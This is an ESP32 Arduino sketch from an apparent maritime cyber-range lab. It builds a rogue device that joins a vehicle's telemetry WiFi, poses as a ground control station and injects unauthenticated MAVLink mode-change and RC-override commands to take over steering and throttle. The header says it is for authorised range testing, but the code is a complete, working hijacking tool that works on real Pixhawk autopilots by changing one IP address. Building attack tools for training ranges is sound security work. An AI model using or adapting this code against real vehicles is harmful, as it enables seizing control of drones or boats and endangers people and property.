/*
 * Maritime Cyber Range -- ESP32 rogue MAVLink C2 node (HIL role #1).
 *
 * Turns an ESP32-WROOM DevKit into a REAL external device on the vehicle's WiFi
 * telemetry network that injects unauthenticated MAVLink commands -- a hardware
 * attacker, not a script on the same host. It connects to the same UDP endpoint
 * the range's mav_bridge / dashboard use and can:
 *   - emit a GCS HEARTBEAT (so the autopilot sees a "ground station"),
 *   - inject SET_MODE (forged mode change),
 *   - inject RC_CHANNELS_OVERRIDE (seize actuator authority).
 * This makes the C2 attack genuinely hardware-in-the-loop against SITL or a real
 * Pixhawk sharing the network.
 *
 * DEPENDENCY: the MAVLink Arduino headers (generate c_library_v2 from
 * ardupilotmega.xml, or install the "MAVLink" library) -- using the official
 * pack functions avoids hand-rolled CRC/field-order bugs. Set TARGET_IP/PORT to
 * your mav_bridge fan-out (constants MAVLINK_* ports) or SITL's UDP out.
 *
 * AUTHORIZED TESTING ONLY. Sending commands to any vehicle/network you do not
 * own and have explicit authorization to test is unlawful. Lab/range use only.
 */
#include <WiFi.h>
#include <WiFiUdp.h>
// Arduino "MAVLink" library (okalachev/mavlink-arduino, v2.x). Including the
// library's own wrapper header is what makes arduino-cli add its include path;
// the wrapper pulls in the common dialect (HEARTBEAT, SET_MODE,
// RC_CHANNELS_OVERRIDE used here). For ArduPilot-specific messages include
// <mavlink/ardupilotmega/mavlink.h> instead.
#include <MAVLink.h>

static const char* WIFI_SSID = "mcr-range";
static const char* WIFI_PASS = "range-test-only";
static const char* TARGET_IP = "192.168.4.1";   // host running mav_bridge/SITL
static const uint16_t TARGET_PORT = 14550;       // a mav_bridge fan-out / SITL out
static const uint8_t  TARGET_SYS = 1, TARGET_COMP = 1;

#define USB_FRAME_DUMP 0   // set 1 to also print each packed frame as hex to USB (bench verify)

WiFiUDP udp;
uint8_t buf[300];

void sendMsg(mavlink_message_t& msg) {
  uint16_t len = mavlink_msg_to_send_buffer(buf, &msg);
  udp.beginPacket(TARGET_IP, TARGET_PORT);
  udp.write(buf, len);
  udp.endPacket();
#if USB_FRAME_DUMP
  for (uint16_t i = 0; i < len; i++) { if (buf[i] < 16) Serial.print('0'); Serial.print(buf[i], HEX); }
  Serial.println();
#endif
}

void sendHeartbeatGCS() {
  mavlink_message_t m;
  mavlink_msg_heartbeat_pack(255, 190, &m, MAV_TYPE_GCS, MAV_AUTOPILOT_INVALID, 0, 0, MAV_STATE_ACTIVE);
  sendMsg(m);
}

void injectSetMode(uint32_t customMode) {
  mavlink_message_t m;
  mavlink_msg_set_mode_pack(255, 190, &m, TARGET_SYS,
                            MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, customMode);
  sendMsg(m);
  Serial.printf("[c2] injected SET_MODE custom=%u\n", customMode);
}

void injectRcOverride(uint16_t steering, uint16_t throttle) {
  mavlink_message_t m;
  // chan1=steering(roll), chan3=throttle; 0 = "ignore / release" per MAVLink.
  mavlink_msg_rc_channels_override_pack(255, 190, &m, TARGET_SYS, TARGET_COMP,
      steering, 0, throttle, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  sendMsg(m);
}

void setup() {
  Serial.begin(115200);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  unsigned long t0 = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t0 < 15000) delay(250);
  udp.begin(14560);
  Serial.printf("[c2] wifi=%d target=%s:%u\n", WiFi.status() == WL_CONNECTED, TARGET_IP, TARGET_PORT);
}

// Demo cadence: present as a GCS, then seize control for 5 s, then release.
// Replace with a UDP/serial command interface for interactive range use.
unsigned long phase = 0;
void loop() {
  sendHeartbeatGCS();
  if (phase == 10) injectSetMode(4 /* HOLD/GUIDED depends on vehicle */);
  if (phase >= 15 && phase < 40) injectRcOverride(1500, 1700);   // seize
  if (phase == 40) injectRcOverride(0, 0);                       // release
  phase++;
  delay(200);   // 5 Hz heartbeat/override cadence
}
